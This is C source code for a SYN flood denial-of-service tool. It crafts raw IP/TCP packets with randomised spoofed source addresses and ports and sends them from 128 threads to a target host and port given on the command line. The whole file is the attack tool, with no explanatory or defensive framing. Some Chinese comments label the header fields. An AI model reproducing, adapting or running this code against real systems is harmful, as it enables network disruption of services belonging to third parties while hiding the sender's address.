#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <string.h> 
#include <pthread.h>
#include <arpa/inet.h>

#define MAXCHILD 128

unsigned int dest_ip=0;
unsigned short dest_port=0;
int alive=-1;
int rawsock;


unsigned short checksum (unsigned short *buffer, unsigned short size)     
{  

	unsigned long cksum = 0;
	
	while(size>1){
		cksum += *buffer++;
		size  -= sizeof(unsigned short);
	}
	
	if(size){
		cksum += *(unsigned char *)buffer;
	}
	
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);		
	
	return((unsigned short )(~cksum));
}

void sigfun(int signo)
{
	alive=0;

}

void*Dos_syn()
{
	char buf[250];
	char sendbuf[250];
	int data[25];
	for(int j=0;j<25;j++)
	{
		data[j]=j;
	}
	int len=sizeof(struct ip)+sizeof(struct tcphdr)+25*sizeof(int);

	struct sockaddr_in to;

	struct pseudohdr
	{
		unsigned int saddr;
		unsigned int daddr;
		char zero;
		char protocol;
		unsigned short length;
	}pseudoheader;
	
	struct dosseg_t
	{
		struct ip iph;
		struct tcphdr tcph;
	}dosseg;
//fill in the head of IP
	dosseg.iph.ip_v=4;//IPV4 版本
	dosseg.iph.ip_hl=5;//首部长度 dosseg.iph->ip_hl=sizeof(struct ip)/sizeof(unsigned int)
	dosseg.iph.ip_tos=0;//区分服务
	dosseg.iph.ip_len=htons(len);//IP长度
	dosseg.iph.ip_id=htons(getpid());//标识 dosseg.iph->ip_id=1
	dosseg.iph.ip_off=0x0000;
	dosseg.iph.ip_ttl=255;//生存时间
	dosseg.iph.ip_p=IPPROTO_TCP;//协议 dosseg.iph.ip_p=IPPROTO_TCP;
	dosseg.iph.ip_sum=0;//检验和
	dosseg.iph.ip_src.s_addr=htonl(rand());//源地址
	dosseg.iph.ip_dst.s_addr=dest_ip;//端地址

//fill in the head of TCP
	dosseg.tcph.source=htons(rand()%16383+49152);//源端口
	dosseg.tcph.dest=htons(dest_port);//目的端口
	dosseg.tcph.seq=htonl(rand()%90000000+2345);//序列号
	dosseg.tcph.doff=5;
	dosseg.tcph.ack_seq=0;//设置确认位
	dosseg.tcph.urg=1;//设置紧急位
	dosseg.tcph.syn=1;//设置同步位
	dosseg.tcph.window=htons(2048);//窗口
	dosseg.tcph.check=0;//检验和初始设置
	dosseg.tcph.urg_ptr=0;//紧急指针
//fill in the pseudoheader
	pseudoheader.zero=0;
	pseudoheader.protocol=IPPROTO_TCP;
	pseudoheader.length=htons(sizeof(struct tcphdr));
	pseudoheader.daddr=dest_ip;
	
	//设置发送socket
	to.sin_family=AF_INET;
	to.sin_addr.s_addr=dest_ip;
	to.sin_port=htons(dest_port);
	

	
	while(alive)
	{
		dosseg.iph.ip_src.s_addr=htonl(rand());//设置乱序源地址
		dosseg.tcph.source=htons(rand()%16383+49152);//设置乱序源端口
		//检验和设置 IP头部检验和 TCP伪首部+首部+数据检验和
		bzero(buf,sizeof(buf));
		memcpy(buf,&dosseg.iph,sizeof(struct ip));
		dosseg.iph.ip_sum=checksum((unsigned short*)buf,sizeof(struct ip));

		bzero(buf,sizeof(buf));
		memcpy(buf,&pseudoheader,sizeof(struct pseudohdr));
		memcpy(buf+sizeof(pseudoheader),&dosseg.tcph,sizeof(struct tcphdr));
		memcpy(buf+sizeof(pseudoheader)+sizeof(struct tcphdr),(char*)&data,25*sizeof(int));
		dosseg.tcph.check=checksum((unsigned short*)buf,sizeof(struct pseudohdr)+sizeof(struct tcphdr)+25*sizeof(int));

		//设置发送数据
		bzero(sendbuf,sizeof(sendbuf));
		memcpy(sendbuf,&dosseg.iph,sizeof(struct ip));
		memcpy(sendbuf+sizeof(struct ip),&dosseg.tcph,sizeof(struct tcphdr));
		memcpy(sendbuf+sizeof(struct ip)+sizeof(struct tcphdr),(char*)&data,25*sizeof(int));
		

		if(sendto(rawsock,sendbuf,len,0,(struct sockaddr*)&to,sizeof(struct sockaddr))<0)
		{
			perror("sendo() error!\n");
			pthread_exit("fail");
		}
		sleep(1);
	}


}

int main(int argc,char**argv)
{
	struct hostent*host=NULL;
	int i=0;
	int err=-1;
	pthread_t pthread[MAXCHILD];
	
	alive=1;

	signal(SIGINT,sigfun);

	srand((unsigned) time(NULL));

	if(argc<3)
		return -1;


	dest_ip=inet_addr(argv[1]);

	if(dest_ip==INADDR_NONE)
	{
		host=gethostbyname(argv[1]);
		if(host==NULL)
		{
			perror("gethostbyname() error!\n");
			return -1;
		}
		memcpy((char*)&dest_ip,host->h_addr,host->h_length); //Remember to transfer the type of dest_ip to char
	}

	dest_port=atoi(argv[2]);

	if(dest_port<0||dest_port>65535)
	{
		perror("port error!\n");
		return -1;
	}

	printf("Now syn_attack IP=(%d.%d.%d.%d),Port=%d\n",(dest_ip&0x000000FF)>>0,(dest_ip&0x0000FF00)>>8,(dest_ip&0x00FF0000)>>16,(dest_ip&0xFF000000)>>24,dest_port);

	rawsock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
	if(rawsock<0)
	{
		perror("socket() error!\n");
		return -1;
	}

	int on=1;
	if(setsockopt(rawsock,IPPROTO_IP,IP_HDRINCL,(char*)&on,sizeof(on))<0)
	{
		perror("setsockopt() error!\n");
		return -1;
	}
		
	for(int i=0;i<MAXCHILD;i++)
	{
		err=pthread_create(&pthread[i],NULL,Dos_syn,NULL);
		if(err!=0)
		{
			perror("pthread_create() error!\n");
			return -1;
		}
		printf("%d-th thread open!\n",i);
		sleep(0.01);
	}

	for(int i=0;i<MAXCHILD;i++)
	{
		pthread_join(pthread[i],NULL);
	}
	close(rawsock);

	return 0;

}
